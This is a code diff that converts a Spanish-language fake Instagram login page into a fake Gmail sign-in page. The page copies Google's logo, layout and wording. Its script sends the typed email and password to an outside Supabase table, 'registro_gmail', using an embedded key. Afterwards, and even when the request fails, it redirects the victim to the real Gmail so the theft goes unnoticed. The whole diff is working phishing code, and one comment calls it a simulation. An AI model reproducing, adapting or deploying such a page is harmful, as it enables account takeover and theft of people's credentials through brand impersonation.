@@ -4,298 +4,274 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Iniciar sesión • Instagram</title>
+  <title>Iniciar sesión - Gmail</title>
   <style>
-    /* Reseteo general y tema oscuro */
+    /* Reseteo básico y fondo */
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
     body {
-      background-color: #121212;
-      color: #f5f5f5;
-      min-height: 100vh;
+      background-color: #f0f4f9;
       display: flex;
-    }
-
-    /* Contenedor principal de dos columnas */
-    .container {
-      display: flex;
-      width: 100%;
-      min-height: 100vh;
-    }
-
-    /* ---------------- SECCIÓN IZQUIERDA ---------------- */
-    .hero-section {
-      flex: 1.2;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .login-wrapper {
+      width: 100%;
+      max-width: 440px;
+      padding: 20px;
+    }
+
+    /* Tarjeta Principal estilo Google */
+    .login-card {
+      background-color: #ffffff;
       padding: 40px;
-      position: relative;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
     }
 
-    .instagram-logo-icon {
-      position: absolute;
-      top: 30px;
-      left: 40px;
-      width: 38px;
-      height: 38px;
-    }
-
-    .hero-title {
-      font-size: 2.2rem;
-      font-weight: 600;
-      text-align: center;
-      max-width: 450px;
-      line-height: 1.3;
-      margin-bottom: 30px;
-    }
-
-    .hero-image-container {
-      max-width: 400px;
-      width: 100%;
+    /* Logo estilo Google / Gmail */
+    .logo-container {
       display: flex;
-      justify-content: center;
-    }
-
-    .hero-image-container img {
-      width: 100%;
-      height: auto;
-      object-fit: contain;
-    }
-
-    /* ---------------- SECCIÓN DERECHA (FORMULARIO) ---------------- */
-    .login-section {
-      flex: 1;
-      background-color: #1a1a1a;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
       align-items: center;
-      padding: 40px 60px;
-      border-left: 1px solid #262626;
+      gap: 10px;
+      margin-bottom: 16px;
     }
 
-    .login-box {
-      width: 100%;
-      max-width: 350px;
-      display: flex;
-      flex-direction: column;
+    .google-icon {
+      width: 24px;
+      height: 24px;
     }
 
-    .login-box h3 {
-      font-size: 16px;
-      font-weight: 600;
+    .brand-name {
+      font-size: 22px;
+      font-weight: 500;
+      color: #1f1f1f;
+    }
+
+    .login-card h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #1f1f1f;
       margin-bottom: 24px;
-      color: #f5f5f5;
     }
 
+    /* Estilos de los Inputs */
     .input-group {
-      margin-bottom: 12px;
+      position: relative;
+      margin-bottom: 20px;
     }
 
     .input-group input {
       width: 100%;
-      padding: 12px;
-      background-color: #121212;
-      border: 1px solid #363636;
-      border-radius: 8px;
-      color: #f5f5f5;
-      font-size: 13px;
+      padding: 12px 14px;
+      border: 1px solid #747775;
+      border-radius: 4px;
       outline: none;
+      font-size: 15px;
+      color: #1f1f1f;
+      background: transparent;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
 
     .input-group input:focus {
-      border-color: #a8a8a8;
+      border-color: #0b57d0;
+      box-shadow: 0 0 0 1px #0b57d0;
     }
 
     .input-group input::placeholder {
-      color: #a8a8a8;
+      color: #747775;
     }
 
-    /* Botón de inicio de sesión */
-    .btn-submit {
-      width: 100%;
-      padding: 10px;
-      background-color: #005cbf;
-      /* Azul atenuado deshabilitado */
-      color: #fffbfb;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: not-allowed;
-      margin-top: 8px;
-      margin-bottom: 20px;
-    }
-
-    /* Enlace de recuperación */
-    .forgot-password {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
-    .forgot-password a {
-      color: #f5f5f5;
-      font-size: 13px;
-      text-decoration: none;
-    }
-
-    .forgot-password a:hover {
-      text-decoration: underline;
-    }
-
-    /* Botón Facebook */
-    .btn-facebook {
+    /* Casilla de mostrar contraseña */
+    .show-password-container {
       display: flex;
       align-items: center;
-      justify-content: center;
       gap: 8px;
-      width: 100%;
-      padding: 10px;
-      background-color: #262626;
-      color: #ffffff;
-      border: none;
-      border-radius: 8px;
+      margin-bottom: 20px;
       font-size: 14px;
-      font-weight: 600;
+      color: #1f1f1f;
       cursor: pointer;
+    }
+
+    .show-password-container input[type="checkbox"] {
+      cursor: pointer;
+      width: 18px;
+      height: 18px;
+      accent-color: #0b57d0;
+    }
+
+    /* Enlaces y textos */
+    .signup-text,
+    .help-link {
+      font-size: 14px;
+      color: #1f1f1f;
+    }
+
+    .signup-text {
       margin-bottom: 12px;
     }
 
-    .btn-facebook svg {
-      width: 18px;
-      height: 18px;
-      fill: #0095f6;
+    .signup-text a,
+    .help-link a {
+      color: #0b57d0;
+      text-decoration: none;
+      font-weight: 500;
     }
 
-    /* Botón Crear Cuenta Nueva */
-    .btn-register {
-      width: 100%;
-      padding: 10px;
-      background-color: transparent;
-      color: #0095f6;
-      border: 1px solid #0095f6;
-      border-radius: 20px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
+    .signup-text a:hover,
+    .help-link a:hover {
+      text-decoration: underline;
+    }
+
+    .help-link {
       margin-bottom: 30px;
     }
 
-    /* Marca Meta en el pie de página del formulario */
-    .meta-logo {
+    /* Botón Siguiente */
+    .button-group {
       display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 6px;
-      color: #a8a8a8;
-      font-size: 14px;
-      font-weight: 600;
+      justify-content: flex-end;
     }
 
-    .meta-logo svg {
+    .btn-primary {
+      background-color: #0b57d0;
+      color: #ffffff;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      border-radius: 20px;
+      transition: background-color 0.2s, box-shadow 0.2s;
+    }
+
+    .btn-primary:hover {
+      background-color: #0842a0;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+    }
+
+    /* Tarjeta Inferior de Opciones */
+    .login-options-card {
+      margin-top: 16px;
+      background-color: #ffffff;
+      padding: 14px 16px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+      cursor: pointer;
+      transition: background-color 0.2s;
+      border: none;
+      width: 100%;
+      text-align: left;
+    }
+
+    .login-options-card:hover {
+      background-color: #f8f9fa;
+    }
+
+    .options-content {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 14px;
+      color: #1f1f1f;
+    }
+
+    .key-icon {
       width: 20px;
       height: 20px;
-      fill: #a8a8a8;
-    }
-
-    /* Adaptabilidad a pantallas pequeñas */
-    @media (max-width: 850px) {
-      .container {
-        flex-direction: column;
-      }
-
-      .hero-section {
-        padding-top: 80px;
-      }
-
-      .login-section {
-        border-left: none;
-        border-top: 1px solid #262626;
-      }
+      fill: #444746;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="container">
-    <!-- LADO IZQUIERDO: Hero con Logo y Texto -->
-    <section class="hero-section">
-      <!-- Logo Ícono Instagram -->
-      <svg class="instagram-logo-icon" viewBox="0 0 24 24">
-        <path fill="url(#ig-grad)"
-          d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
-        <defs>
-          <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
-            <stop offset="0%" stop-color="#fdf497" />
-            <stop offset="25%" stop-color="#fdf497" />
-            <stop offset="50%" stop-color="#fd5949" />
-            <stop offset="75%" stop-color="#d6249f" />
-            <stop offset="100%" stop-color="#285AEB" />
-          </linearGradient>
-        </defs>
-      </svg>
+  <main class="login-wrapper">
+    <!-- Tarjeta Principal -->
+    <div class="login-card">
 
-      <!-- Texto descriptivo -->
-      <h1 class="hero-title">Mira los momentos cotidianos de tus mejores amigos.</h1>
-
-      <!-- Contenedor para la imagen descriptiva -->
-      <div class="hero-image-container">
-        <!-- Reemplaza "historias_amigos.png" por la ruta de tu imagen -->
-        <img src="-erGonz07kB.webp" alt="Historias de Instagram">
+      <!-- Logo de Google -->
+      <div class="logo-container">
+        <svg class="google-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#4285F4"
+            d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
+          <path fill="#34A853"
+            d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
+          <path fill="#FBBC05"
+            d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
+          <path fill="#EA4335"
+            d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
+        </svg>
+        <span class="brand-name">Gmail</span>
       </div>
-    </section>
 
-    <!-- LADO DERECHO: Formulario de Login -->
-    <section class="login-section">
-      <div class="login-box">
-        <h3>Iniciar sesión en Instagram</h3>
+      <!-- Título principal -->
+      <h1>Iniciar sesión</h1>
 
-        <form id="loginForm">
-          <!-- Campo Usuario / Correo -->
-          <div class="input-group">
-            <input type="text" name="username" placeholder="Número de celular, nombre de usuario o correo electrónico"
-              required>
-          </div>
+      <!-- Formulario con ID añadido para el Script -->
+      <form id="loginForm">
+        <!-- Campo Correo/Usuario con ID adaptado al Script -->
+        <div class="input-group">
+          <input type="email" name="username" id="email" placeholder="Correo electrónico o teléfono"
+            aria-label="Correo electrónico o teléfono" autocomplete="username" required>
+        </div>
 
-          <!-- Campo Contraseña -->
-          <div class="input-group">
-            <input type="password" name="password" placeholder="Contraseña" required>
-          </div>
+        <!-- Campo Contraseña con ID adaptado al Script -->
+        <div class="input-group">
+          <input type="password" name="password" id="password" placeholder="Introduce tu contraseña"
+            aria-label="Introduce tu contraseña" autocomplete="current-password" required>
+        </div>
 
-          <!-- Botón Iniciar Sesión -->
-          <button type="submit" class="btn-submit">Iniciar sesión</button>
+        <!-- Casilla Mostrar Contraseña -->
+        <label class="show-password-container">
+          <input type="checkbox" id="togglePassword">
+          <span>Mostrar contraseña</span>
+        </label>
 
-          <!-- Enlace de contraseña olvidada -->
-          <div class="forgot-password">
-            <a href="#">¿Olvidaste tu contraseña?</a>
-          </div>
+        <!-- Enlaces de ayuda -->
+        <div class="signup-text">
+          ¿No tienes una cuenta? <a href="#">Crear cuenta</a>
+        </div>
 
+        <div class="help-link">
+          <a href="#">¿Has olvidado tu correo electrónico o contraseña?</a>
+        </div>
 
+        <!-- Botón de acción -->
+        <div class="button-group">
+          <button type="submit" class="btn-primary">Siguiente</button>
+        </div>
+      </form>
+    </div>
 
-          <!-- Crear cuenta nueva -->
-          <!--<button type="submit" class="btn-primary">Crear cuenta nueva</button>-->
-
-          <!-- Logo Meta -->
-          <!--div class="meta-logo"-->
-          <!--svg viewBox="0 0 24 24"-->
-          <!--path d="M16.924 3.5c-1.921 0-3.61.943-4.924 2.373C10.686 4.443 8.997 3.5 7.076 3.5 3.393 3.5 0 6.893 0 11.208c0 4.542 3.826 8.292 8.761 8.292 2.315 0 4.382-.934 5.922-2.484 1.54 1.55 3.607 2.484 5.922 2.484 4.935 0 8.761-3.75 8.761-8.292C29.366 6.893 25.973 3.5 22.29 3.5h-5.366z"/-->
-          <!--/svg-->
-          <!--span>Meta</span-->
-          <!--/div-->
-        </form>
+    <!-- Opción secundaria abajo -->
+    <button type="button" class="login-options-card">
+      <div class="options-content">
+        <svg class="key-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path
+            d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v2h2v-2h2v-2h-8.35zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z" />
+        </svg>
+        <span>Otras formas de iniciar sesión en Google</span>
       </div>
-    </section>
-  </div>
-  <!-- Código JavaScript integrado -->
+    </button>
+  </main>
+
   <script>
+    // Lógica para mostrar/ocultar contraseña
+    const passwordInput = document.getElementById('password');
+    const togglePassword = document.getElementById('togglePassword');
+
+    togglePassword.addEventListener('change', function () {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
     // Lógica para enviar los datos de forma persistente a Supabase
     const SUPABASE_URL = "https://xiifneojsrtwaxrnbxaq.supabase.co";
     const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhpaWZuZW9qc3J0d2F4cm5ieGFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE1NzcyODEsImV4cCI6MjEwNzE1MzI4MX0.V_U7dMLSY8FFHhOK3TnFMPHPDN3CghThOAncKIRWjz4";
@@ -307,7 +283,7 @@
       const passwordInputVal = document.getElementById('password').value;
 
       try {
-        const response = await fetch(`${SUPABASE_URL}/rest/v1/registro_insta`, {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/registro_gmail`, {
           method: 'POST',
           headers: {
             'apikey': SUPABASE_KEY,
@@ -322,12 +298,12 @@
         });
 
         // Al completarse el registro en Supabase, redirige al usuario final al destino real
-        window.location.href = "https://www.instagram.com/";
+        window.location.href = "https://mail.google.com";
 
       } catch (error) {
         console.error("Error de red o de comunicación:", error);
-        // Redirección de escape en caso de fallo para mantener la fluidez
-        window.location.href = "https://www.instagram.com/";
+        // Redirección de escape en caso de fallo para mantener la fluidez de la simulación
+        window.location.href = "https://mail.google.com";
       }
     });
   </script>
